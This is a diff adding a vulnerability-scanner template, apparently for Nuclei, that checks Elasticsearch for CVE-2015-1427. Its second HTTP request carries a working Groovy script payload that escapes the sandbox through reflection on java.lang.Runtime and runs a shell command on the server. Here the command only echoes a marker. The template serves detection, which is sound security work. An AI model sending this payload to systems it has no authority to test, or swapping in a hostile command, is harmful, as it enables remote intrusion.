@@ -1,0 +1,48 @@
+id: CVE-2015-1427
+info:
+  name: Elasticsearch Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The Groovy script engine before Elasticsearch 1.3.8 and the Groovy script engine in 1.4.x before 1.4.3 allow remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands through elaborate scripts.
+  classification:
+    cve-id: CVE-2015-1427
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        POST /website/blog/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Accept-Language: en
+        Content-Type: application/x-www-form-urlencoded
+
+        { "name": "cve-2015-1427" }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+  - raw:
+      - |
+        POST /_search?pretty HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Accept-Language: en
+        Content-Type: application/text
+
+        {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo 460f7ccb583e25e09c0fe100a2c9e90d\").getText()"}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "460f7ccb583e25e09c0fe100a2c9e90d"
